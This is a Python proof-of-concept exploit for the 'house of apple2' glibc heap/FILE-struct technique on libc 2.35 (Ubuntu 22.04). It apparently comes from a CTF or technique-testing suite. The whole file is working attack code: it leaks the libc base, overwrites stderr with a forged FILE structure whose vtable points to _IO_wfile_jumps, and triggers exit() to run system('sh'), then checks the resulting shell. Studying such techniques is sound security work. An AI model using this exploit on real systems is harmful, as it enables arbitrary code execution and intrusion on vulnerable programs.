"""house_of_apple2_execmd_when_exit 的 POC（libc 2.35, Ubuntu 22.04）

Technique: Overwrite stderr's vtable to _IO_wfile_jumps, forge _wide_data/_codecvt
to hijack control flow: _IO_wfile_overflow -> _IO_wdoallocbuf -> system("sh")

Trigger: exit() calls _IO_flush_all_lockp
"""
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

from pwn import *
from pwncli.utils.toolkit.io_file import IO_FILE_plus_struct
from helper import *

context.arch = "amd64"
context.log_level = "info"

GLIBC_VERSION = "2.35-0ubuntu3"


def exploit():
    io, elf, libc = start(GLIBC_VERSION)

    libc.address = leak_libc_base(io, libc)
    log.success(f"libc base: {hex(libc.address)}")

    _IO_2_1_stderr_ = libc.sym['_IO_2_1_stderr_']
    _IO_wfile_jumps = libc.sym['_IO_wfile_jumps']
    system = libc.sym['system']

    log.info(f"_IO_2_1_stderr_: {hex(_IO_2_1_stderr_)}")
    log.info(f"_IO_wfile_jumps: {hex(_IO_wfile_jumps)}")
    log.info(f"system: {hex(system)}")

    fake_file = IO_FILE_plus_struct()
    payload = fake_file.house_of_apple2_execmd_when_exit(
        fake_file_addr=_IO_2_1_stderr_,
        _IO_wfile_jumps_addr=_IO_wfile_jumps,
        system_addr=system,
        cmd="sh"
    )

    # Write the forged FILE struct over _IO_2_1_stderr_
    arb_write(io, _IO_2_1_stderr_, payload)

    # Trigger via exit
    log.info("Triggering exit()...")
    do_exit(io)

    io.sendline(b"echo PWNED")
    try:
        result = io.recvuntil(b"PWNED", timeout=3)
        if b"PWNED" in result:
            log.success("house_of_apple2_execmd_when_exit: SUCCESS")
            io.close()
            return True
    except:
        pass

    log.failure("house_of_apple2_execmd_when_exit: FAILED")
    io.close()
    return False


if __name__ == "__main__":
    result = exploit()
    sys.exit(0 if result else 1)
